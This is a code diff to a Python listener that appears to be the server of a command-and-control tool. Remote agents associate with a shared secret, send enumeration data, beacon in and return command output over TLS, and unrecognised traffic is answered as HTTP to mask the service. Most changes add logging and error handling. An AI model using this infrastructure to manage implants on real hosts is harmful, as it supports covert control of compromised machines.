@@ -20,9 +20,11 @@ class Listener():
         self.listeners = listeners
         self.uuid = uuid.uuid4()
         self._killed = False
+        self.logger = logging.getLogger(__name__)
+        logging.debug(str(self.uuid) + ' Listener spawned')
 
     def _kill(self):
-        print('closing socket')
+        logging.debug(str(self.uuid) + ' Closing socket')
         socket(AF_INET, 
                SOCK_STREAM).connect((self.host, self.port))
         self.tcp_socket.close()
@@ -42,17 +44,23 @@ class Listener():
 
     def associate_agent(self, json_stub, connection):
         agent_uuid = json_stub['uuid']
+        logging.debug(str(self.uuid) + ' Associating agent with UUID: ' + agent_uuid)
         # If the agent has already been associated, skip
         for uuid, agent in self.agents.items():
             if uuid == agent_uuid:
+                logging.debug(str(self.uuid) + ' Agent already seen! Updating lastseen time.')
                 agent.update_lastseen()
-                connection.close()
+                connection.send('_response{"status" : "ACK"}'.encode())
+                connection.close() 
                 return
         lastseen = time.time()
-        tmp_agent = Agent(self, agent_uuid, lastseen)
+        enumdata = json_stub['enumdata']
+        tmp_agent = Agent(self, agent_uuid, lastseen, enumdata)
         self.agents[agent_uuid] = tmp_agent
         connection.send('_response{"status" : "ACK"}'.encode())
         connection.close()
+        logging.debug(str(self.uuid) + ' Agent associated successfully.')
+        
 
     def beacon_respond(self, json_stub, connection):
         agent_uuid = json_stub['uuid']
@@ -98,35 +106,32 @@ class Listener():
         connection.close()
 
     def handle_proto_msg(self, proto_msg, connection):
-        """
-        Protocol handler. Protocol defines the following packet types:
-
-        Association:
-        _associate{ secret:"mysecret", uuid:"myuuid" }
-
-        Beacon:
-        _beacon{ secret:"mysecret", uuid:"myuuid" }
-
-        Response:
-        _response{ secret:"mysecret", uuid:"myuuid", data:"cmd_response" }
-        """
-
+        logging.debug(str(self.uuid) + ' Handling protocol message: ' + proto_msg)
         if '_associate' in proto_msg:
-            json_stub = json.loads(proto_msg[10:])
+            try:
+                json_stub = json.loads(proto_msg[10:])
+            except:
+                serve_http(connection, proto_msg)
             try:
                 if json_stub['secret'] == self.secret:
                     self.associate_agent(json_stub, connection)
             except KeyError:
                 serve_http(connection, proto_msg)
         elif '_beacon' in proto_msg:
-            json_stub = json.loads(proto_msg[7:])
+            try:
+                json_stub = json.loads(proto_msg[7:])
+            except:
+                serve_http(connection, proto_msg)
             try:
                 if json_stub['secret'] == self.secret:
                     self.beacon_respond(json_stub, connection)
             except KeyError:
                 serve_http(connection, proto_msg)
         elif '_response' in proto_msg:
-            json_stub = json.loads(proto_msg[9:])
+            try:
+                json_stub = json.loads(proto_msg[9:])
+            except:
+                serve_http(connection, proto_msg)
             try:
                 if json_stub['secret'] == self.secret:
                     self.get_response(json_stub, connection)
@@ -137,21 +142,24 @@ class Listener():
         connection.close()
 
     def main_thread(self):
+        logging.debug(str(self.uuid) + ' Listener thread started')
         self.tcp_socket = socket(AF_INET, SOCK_STREAM)
         self.tcp_socket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
         try:
+            logging.debug(str(self.uuid) + ' Listener binding socket')
             self.tcp_socket.bind((self.host, self.port))
             self.listeners.append(self)
         except:
-            logging.warning('Listener failed.')
+            logging.error(str(self.uuid) + ' Listener failed.', exc_info=True)
             return
         self.tcp_socket.listen(1)
+        logging.debug(str(self.uuid) + ' Listener wrapping socket in TLS')
         self.wrapped_socket = ssl.wrap_socket(self.tcp_socket,
                                               server_side=True,
                                               certfile='data/cert.pem',
-                                              keyfile='data/cert.pem',
-                                              ssl_version=ssl.PROTOCOL_TLSv1_2)
+                                              keyfile='data/cert.pem')
 
+        logging.debug(str(self.uuid) + ' Listener listening...')
         while not self._killed:
             try:
                 connection, address = self.wrapped_socket.accept()
@@ -161,4 +169,4 @@ class Listener():
                     args=((data, connection))
                     ).start()
             except ssl.SSLError as e:
-                print('ssl error' + str(e))
+                logging.error(str(self.uuid) + ' Listener SSL error.', exc_info=True)
